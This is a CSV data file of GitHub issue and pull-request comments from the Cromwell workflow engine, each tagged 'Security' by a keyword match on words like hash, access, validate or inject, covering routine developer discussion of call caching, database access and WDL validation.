Security,"@antonkulaga Cromwell has [filesystem option](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) `fingerprint` to hash without having to read the whole file. It is supported by the HPC community, and not by the Cromwell team. Haven't tried it myself, but I wonder whether it would solve your problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967:144,hash,hash,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967,1,['hash'],['hash']
Security,"@antonkulaga It appears that changing the `name` only changes the filename of the output produced by your task, but not the actual processing. So I bet if you look at the files produced by the diamond blast task for all 3 workflows you'll see that even though their names differ they have the same content.; Cromwell by default only cares about the content of a file with respect to call caching and its name is ignored. In this case it likely md5ed the files and found they had the same hash so the copy task was cached.; I'll wait for you to confirm that the output files have indeed the same hash before closing this:. ```; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/ab101af5-26ba-45c8-b592-fb37e06a523d/call-diamond_blast/execution/graywhale_in_human_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/3d75657d-7dc9-4b6f-bbc8-ae579a3fa773/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/276d6f9e-15b1-4dc3-a8a7-889414406511/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; ```. should all produce the same hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450:488,hash,hash,488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450,3,['hash'],['hash']
Security,"@ccarrizo A call wraps a single command line and thus can only be run on a single backend, correct? Composed backends wouldn't apply for a call. We have a need to be able to report back certain backend specific values and from an operational/regulatory perspective we need to track other things for provenance and such. That information needs to be persisted somewhere - should the backends know about the DB (let's ignore for them oment that one backend does indeed talk directly to the DB)? If not that implies now need to know about the internal persistence. What if we decide to bulkhead all DB access behind a specialized actor/router? You can point to separating out the persistence but that's far beyond the scope of this work and is a separate block entirely. I viewed this as a transitional PR. There'd been a request from team members on our side for a while now that things be done as bit by bit as possible. To do that implies not having full & sweeping changes as the only way to do _that_ is one monolithic PR which causes a ton of problems. The whole process would be a bit smoother if you all could find other portions which could be folded directly into develop _now_ which started to move the ball in the right direction instead of requiring that everything be perfect in one fell swoop.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182388303:599,access,access,599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182388303,1,['access'],['access']
Security,"@cjllanwarne - Here goes... This works:; ```; workflow wf {; call tsk {; input: foo=""Hello"", bar=""World""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```; This doesn't:; ```; workflow wf {; call tsk {; input: foo=""Hello""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```. When `bar` is left out, job stays in the running state, and exceptions are continually thrown in the server logs.; The wdl validates fine.; Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981:508,validat,validates,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981,1,['validat'],['validates']
Security,"@cjllanwarne . I have checked out the path+modtime strategy and it is not fundamentally different from the path strategy. That means that it should also work for the path strategy. I wonder why the documentation states otherwise. @cpavanrun @illusional I know you are wondering whether these hashing-strategies work. So hereby I alert you to the fact that they work, it is just not in the documentation yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513141626:292,hash,hashing-strategies,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513141626,1,['hash'],['hashing-strategies']
Security,"@cjllanwarne :. > Everything has access to the ServiceRegistry. This premise still holds. Why do you think otherwise?. > Anyone (including the Engine) can send a MetadataPut message to the ServiceRegistry, which will forward it automagically to the MetadataService. This is how the magic is currently happening as well. The engine _is_ sending MetadataPut messages to the ServiceRegistry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219110124:33,access,access,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219110124,1,['access'],['access']
Security,"@cjllanwarne ; Are you saying that Cromwell is going to determine if the input file is reference file by checking each input file against the manifest file? This is not how I imagined it. I thought manifest file with checksums is only needed to verify file's up-to-dateness. I imagined it work this way: when user creates a WDL and specifies input files for the workflow, they would look like `gs://gcp-public-data--broad-references/some/path/reference_file.txt`. Cromwell will see this path and think ""ok, this file is a reference file, since it's located in this special bucket, so I will mount a references disk to `/mnt/refdisk` and check for this file in the `/mnt/refdisk/some/path/reference_file.txt` location, but before going on and doing that I'll verify that checksum of that file in GCS matches the one in manifest file"".; I mean bucket name seems redundant in this case, since it's the same for all reference files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517:217,checksum,checksums,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517,2,['checksum'],"['checksum', 'checksums']"
Security,"@cjllanwarne @scottfrazer Note that I removed the deprecation notice from validate. While the current form wouldn't be long for this world we know that it'll reappear w/ slightly different functionality. Instead of removing it and re-adding the endpoint IMO we might as well leave it here (e.g. in the future it wouldn't be a wdl validation but just a workflow validation - whether that be wdl, cwl, etc - in the context of that cromwell jar)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/402#issuecomment-174547479:74,validat,validate,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/402#issuecomment-174547479,3,['validat'],"['validate', 'validation']"
Security,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:189,access,access,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,4,['access'],['access']
Security,"@cjllanwarne Do you need a red review on this ? If so could you elaborate just a little on what ; > Allows reading of WDL 1.0 and 1.1 Asts through a shared set of CheckedAtoB functions, with the flexibility to inject different transform behavior into each usage of the instantiations of the transforms. means for me poor mortal and / or point to relevant code that I should look at ? 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3852#issuecomment-402194081:210,inject,inject,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3852#issuecomment-402194081,1,['inject'],['inject']
Security,@cjllanwarne I do think the existing test suite should validate this sufficiently apart from the issues raised in the separate Google Doc regarding retries and the probabilities of failure with transferring multiple files.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707:55,validat,validate,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707,1,['validat'],['validate']
Security,"@cjllanwarne I have had a look bit it is quite non-trivial to find how to evaluate paths at the womValueInputs stage, as cromwell has no knowledge of the backend at this point. This ""relative path"" business only makes sense for the sfsBackend which handles access to local systems. For cloud systems relative paths make no sense at all. ; Evaluating it at the JobPreparationActor is the correct spot, although the implementation ends up to be a bit messy :confused: .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618941883:257,access,access,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618941883,1,['access'],['access']
Security,"@cjllanwarne I'm probably misreading the convo but I was reading this to imply that a cromwell-singleton data access object would be getting hit harder from running our unit tests in terms of connections than real life, but in the latter we could conceivably have many thousands of workflows (and thus many, many thousands of tasks) banging on the DB simultaneously. A teensy threadpool isn't going to be able to handle the latter case. Another possibility (which we originally looked at but discarded for non-singleton data access) is to have an actual data access actor, and then that actor can scale horizontally as needed via a router actor. those actors can even be on different machines if CPU load is an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225:110,access,access,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225,3,['access'],['access']
Security,"@cjllanwarne I've lost write access to the Cromwell repo, so I'm unable to resolve the conflicts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034:29,access,access,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034,1,['access'],['access']
Security,"@cjllanwarne Not sure if this is related (tell me if I should file another issue), but all jobs should be cache hits. Yet, I can see that it is running jobs. This may be due to the ""path"" hashing strategy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703:188,hash,hashing,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703,1,['hash'],['hashing']
Security,"@cjllanwarne Right, but what I meant was that I'm not sure ""give me a diagram of workflow timings"" is really something which should be served up at all by Cromwell. Rather give access to the data and let something else figure out what they want to do with it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/266#issuecomment-153117050:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/266#issuecomment-153117050,1,['access'],['access']
Security,"@cjllanwarne Scattering over a map does not work with Cromwell-37. The workflow below doesn't pass wom validation. ```wdl; version 1.0. task add {; input {; Int a; Int b; }; command {}; output {; Int result = a + b; }; }. workflow dict2 {; Map[Int, Float] mIF = {1: 1.2, 10: 113.0}. scatter (p in mIF) {; call add {; input: a=p.left, b=5; }; }. output {; Array[String] result = add.result; }; }; ```. ```bash; $ java -jar womtool-37.jar validate dict2.wdl. Failed to process workflow definition 'dict2' (reason 1 of 1): Invalid type for scatter variable 'p': Map[Int, Float]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255:103,validat,validation,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255,2,['validat'],"['validate', 'validation']"
Security,"@cjllanwarne Thanks for fixing this so fast. For validation I just skip version 32 ;) When is 33 planned?. We want to upgrade to wdl 1.0 anyway but first need to complete our testing framework around wdl, see also https://github.com/biopet/biowdl-test-utils (library) and https://github.com/biowdl/QC (real pipeline with testing)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541:49,validat,validation,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541,1,['validat'],['validation']
Security,"@cjllanwarne Thanks so much for your response. I am unfortunately getting a new error. Which is as follows:; ```; [2020-08-24 15:28:47,48] [error] 'nioPath' not implemented for SraPath; java.lang.UnsupportedOperationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundRec",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:591,hash,hashCode,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,5,['hash'],"['hashCode', 'hashing']"
Security,"@cjllanwarne The ""causedBy"" nested thing is weird. I'm also not sure how many different formats there are. There's the ""message""; ```; ""failures"": [{; ""message"": ""Task c386672d-0248-4968-9b1a-114f5f5c4706:echo_files failed: error code 5. Message: 8: Failed to pull image ubuntu:latest: \""docker --config /tmp/.docker/ pull ubuntu:latest\"" failed: exit status 1: Pulling repository docker.io/library/ubuntu\nNetwork timed out while trying to connect to https://index.docker.io/v1/repositories/library/ubuntu/images. You may want to check your internet connection or if you are behind a proxy.\n""; }]; ```; and then there's the ""failure"" and timestamp"" :; ```; ""failures"": [{; ""timestamp"": ""2016-08-01T19:58:04.704000Z"",; ""failure"": ""com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request\n{\n \""code\"" : 400,\n \""errors\"" : [ {\n \""domain\"" : \""global\"",\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""reason\"" : \""badRequest\""\n } ],\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""status\"" : \""INVALID_ARGUMENT\""\n}""; }],; ```; and then the caused by: ; ```; ""failures"": [{; ""causedBy"": {; ""causedBy"": {; ""message"": ""connect timed out""; },; ""message"": ""Error getting access token for service account: ""; },; ""message"": ""Failed to upload authentication file""; }]; ```. So, if there are these 3 different ways to show the failures section, I'm not sure if there are more formats that I missed in my cursory examination. My dream is that there would be a consistent format for the failures section that we could reliably programmatically find and display.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064:1427,access,access,1427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"@cjllanwarne The commit hash was 519708d9cafd4c4886d089f3cdf545879d81812c; I ran it in run mode, something along the lines of this: `java -jar ~/Desktop/cromwell-35-SNAPSHOT.jar run test2.wdl` (jar name not exact)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411175536:24,hash,hash,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411175536,1,['hash'],['hash']
Security,"@cjllanwarne The problem with not injecting, and creating separate tasks, is that you either have to clone the entire repo again for each of the tasks to extract the version information etc.., or clone it once and pass around the execution dir of the corresponding task which is even more horrible IMO.; Unless there's another way I'm missing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-286472793:34,inject,injecting,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-286472793,1,['inject'],['injecting']
Security,"@cjllanwarne Unfortunately it looks like this is a separate issue. I tried running it with the file-path hashing method: When I ran it with a wide scatter (312) it hangs before it starts any tasks in the scatter. When I ran it with a small scatter (6) it ""starts"" the jobs inside the scatter but the timing diagram just says `QueuedInCromwell` for all of them. It might not be the fact that there are declarations inside of the scatter, but the fact that those declarations include declaring multiple files, which all happen at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222:105,hash,hashing,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222,1,['hash'],['hashing']
Security,"@cjllanwarne Yes, my money is that you have pegged this exactly. I would love this update. I prefer the ``Int? mem=4`` for specifying default values. Otherwise, we have to pepper our command and runtime blocks with ``${default=4 mem}`` or, even worse, something with ``select_first``. We often have inputs that are derived (e.g. ``e``) and we do not want these exposed in ``wdltool inputs ...``. I do not have a good idea for how to handle ``f``. I'm assuming you do not have access to the raw expression when rendering ``wdltool inputs ...``, so can you just say that it has a complex default expression?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2532#issuecomment-321288565:361,expose,exposed,361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2532#issuecomment-321288565,2,"['access', 'expose']","['access', 'exposed']"
Security,@cjllanwarne can you explain why users use Pair access?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2300#issuecomment-332235119:48,access,access,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2300#issuecomment-332235119,1,['access'],['access']
Security,@cjllanwarne is this still true ? From what I see the EJEA is waiting for the hashes to be written before reporting that it's finished,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1995#issuecomment-305589282:78,hash,hashes,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1995#issuecomment-305589282,1,['hash'],['hashes']
Security,"@cjllanwarne the reason was that `WdlNamespace.load` was throwing an `ValidationException` which unfortunately is a `Throwable` but not an `Exception`, which is why there's also a PR in lenthall to make `AggregatedException` an `Exception`... I can't find a `missing_import` test in centaur though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572:70,Validat,ValidationException,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572,1,['Validat'],['ValidationException']
Security,"@cjllanwarne yes, comments were hidden due to file name change.; Ans 1. Adding hidden comment I did: Caching functionality is missing here. Shouldn't each backend implement caching and when engine ask for a jobExecutor, backend may return BackendCachedJobExecutor?; Doing that we can get rid of the engine responsibility to deal with cached data...; IMO, Cache should be encapsulated in each backend. The only thing I'm not sure if we should expose a standard message to force not to use cached data. So with that you tell to each backend to not use cached data but instead to process data again.; Ans 2. I'm not seeing any new msg for WorkflowBackendActor right now. That will depend on the UCs... for CCC backend those msgs are OK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495:442,expose,expose,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495,1,['expose'],['expose']
Security,"@cjllanwarne: I also encountered this issue. Until the mentioned upgrade script is released, is information available that highlights the changes necessary to migrate from draft 2 (or 3/1) to WDL 1.0? My files are in draft-2 format. Any sort of guidance about what's different between the versions would be helpful. Doing a visual diff of the `SPEC.md` files isn't ideal... Somewhat related: Is there an estimate of when womtool will have `-imports` exposed as a parameter?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-399565111:450,expose,exposed,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-399565111,2,['expose'],['exposed']
Security,"@danbills The Orchestrator pattern as described above is what we discussed. . Per your other questions, the answer is that AWS Batch does not take a array of arbitrary scripts as an option, nor can you override a Docker container's `ENTRY_POINT` to supply your own script if the entry point of the container has been changed from the default shell. You can only specify an array to pass into Docker daemon's `CMD`. Speaking of default shells, the other arguments against a set of shell scripts is that it limits the set of containers that can be called from a WDL. For example, the current Cromwell scripts that are injected into the container assume Bash support, but by default Alpine Linux (and many containers that build off of it) do not have Bash installed. . Most of the time the above two items are safe assumptions, but not always, hence the current plan to implement data staging via a sibling container approach similar to how CI systems are deployed today. For inspiration, I refer to [Dave Hein's excellent article on running sibling containers in lieu of docker-in-docker](https://www.develves.net/blogs/asd/2016-05-27-alternative-to-docker-in-docker/)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987:616,inject,injected,616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987,1,['inject'],['injected']
Security,@davidbernick @hjfbynara would you please confirm update script has been run so that I can rule out pingdom/firewall issues?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4164#issuecomment-452850659:108,firewall,firewall,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4164#issuecomment-452850659,1,['firewall'],['firewall']
Security,"@dheiman for what it's worth, ""why a call was cached"" is very conservative, so you can be assured that yes, your file's hash exactly matched the old input. As indeed did every other input value, the command string, the relevant workflow and runtime options, and the docker image specified. If anything wasn't the same, Cromwell wouldn't have used the cached result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210:120,hash,hash,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210,1,['hash'],['hash']
Security,@dinvlad In my PR (#5023) the intention was to allow users to be able to interact with BQ from inside their WDL commands. With that in mind I believe what you're suggesting is that nothing untoward would happen unless they did this and their service account didn't have the corresponding permission set. Is that correct?. I still think it's worth testing to be sure but since it looks like we've added scopes before w/o issue I'm less fearful .... but IMO there's still a risk and we should make sure the risk is 0. Denis - it's on my list to poke at this but if you all don't want to wait for me and would like to validate success/failure please feel free to do so,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296:615,validat,validate,615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296,1,['validat'],['validate']
Security,"@dtenenba , @vortexing - The [docs](https://docs.opendata.aws/genomics-workflows) for creating the genomics workflow environment (i.e. AWS Batch and related resources) have been updated. Use of custom AMIs has been deprecated in favor of using EC2 Launch Templates. There's also additional parameter validation under the hood around setting up an environment for Cromwell to avoid these configuration errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885:300,validat,validation,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885,1,['validat'],['validation']
Security,@dvoet Is it acceptable for Cromwell to hash the dos url string itself for the purposes of call caching? Would this ever be different in the future?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752:40,hash,hash,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752,1,['hash'],['hash']
Security,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:71,checksum,checksum,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880,2,"['checksum', 'validat']","['checksum', 'validation']"
Security,"@francares I'm not saying the engine itself _needs_ to know (although I could envision a scenario where it'd be useful for it to know), I'm saying that the outside world needs to know information particular to the backend. That information needs to be stored somewhere and right now the only somewhere is in the DB which is accessed purely through engine. I see this PR as a transition point - it's against develop which does _not_ have pluggable backends but starts to remove the direct requirements (i.e. the backend specific tables). It's not the final state things will live in but it makes the ultimate changes smaller down the road.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182531090:324,access,accessed,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182531090,1,['access'],['accessed']
Security,"@francares The backend call actor sends the call to a backend for execution. The FinalCall actor runs tidy-up code locally (i.e. inside cromwell) at the end of an entire workflow (for now - the nice thing about having this in the actor ecosystem is that it's easy to move these wherever and whenever we want). This change is mainly just refactoring of a Future into an explicit actor, so that we can add more easily (do you have access to the Jira backlog? See issue 2542). Your second comment sound ominous... could you elaborate?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608:429,access,access,429,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608,1,['access'],['access']
Security,@gauravs90 @francares Please note I've rebased and therefore had to update the ValidateActor to no longer require a backend on construction. I've also modified ValidateActorSpec to feed in the mock backend to the static CromwellBackend pool during testing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078:79,Validat,ValidateActor,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/586#issuecomment-199336078,2,['Validat'],"['ValidateActor', 'ValidateActorSpec']"
Security,"@gauravs90 I'm slightly confused here!. The model I thought we agreed on was:; - Everything has access to the `ServiceRegistry`; - Anyone (including the Engine) can send a `MetadataPut` message to the `ServiceRegistry`, which will forward it automagically to the `MetadataService`.; - ... That's it!. So, just send a bunch of `MetadataPut` messages to `ServiceRegistry` from the engine, and you're done, no need for all the extra stuff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219083782:96,access,access,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219083782,1,['access'],['access']
Security,"@gauravs90 I've generally seen the akka folks recommend directly passing references to actors which need to be used. That has multiple benefits (e.g. makes it easy to switch out and/or dep injection, etc). My off the cuff reaction is that that seems simpler to just pass the required reference around, although I'll admit I'm basing that purely on your description and not having looked at the changes yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/822#issuecomment-218866972:189,inject,injection,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/822#issuecomment-218866972,2,['inject'],['injection']
Security,@gauravs90 is it possible to make ValidateActor a singleton in this PR or would you rather spin that out as a new PR?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196365782:34,Validat,ValidateActor,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196365782,1,['Validat'],['ValidateActor']
Security,"@gemmalam - I am trying to access the JIRA tickets for cromwell. I followed the link in the README and created an account, but I'm getting a message ""<my_email_address> doesn't have access to Jira on broadworkbench.atlassian.net.""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1095862028:27,access,access,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1095862028,2,['access'],['access']
Security,@gemmalam Could you give me access to view this issue? email: davycats.dc@gmail.com,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498156531:28,access,access,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498156531,1,['access'],['access']
Security,@gemmalam I tried to create an account but got an error saying I don't have access,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-498771071:76,access,access,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-498771071,1,['access'],['access']
